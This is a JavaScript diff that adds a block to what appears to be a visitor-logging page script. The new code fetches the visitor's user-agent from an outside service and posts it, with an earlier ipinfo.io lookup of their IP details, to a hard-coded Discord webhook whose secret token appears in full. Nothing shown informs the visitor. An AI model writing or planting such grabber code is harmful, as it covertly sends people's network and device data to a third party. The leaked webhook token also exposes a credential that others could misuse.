@@ -30,6 +30,33 @@ $.getJSON("https://ipinfo.io/json", function(data) {
     },
     body: JSON.stringify(params)
   }).then(res => {
-    console.log(res);
   }) 
 })
+
+$.getJSON("https://uploadbeta.com/api/user-agent/", function(data) {         
+  var params = {
+    embeds: [
+      {
+        "title": "Device Info",
+        "color": 15258703,
+        "thumbnail": {
+        },
+        "fields": [
+          {
+            "name": "Device",
+            "value": `> ${data}`
+          }
+        ]
+      }
+    ]
+  }
+  fetch('https://discordapp.com/api/webhooks/1052117287903187015/IxjBejoGAgsORjqP5xGFa6k8CEglMa4IGzi8IKm8B4EF8FblFPgo9i-BQzv4yirlilco', {
+    method: "POST",
+    headers: {
+        'Content-type': 'application/json'
+    },
+    body: JSON.stringify(params)
+  }).then(res => {
+  }) 
+})
+
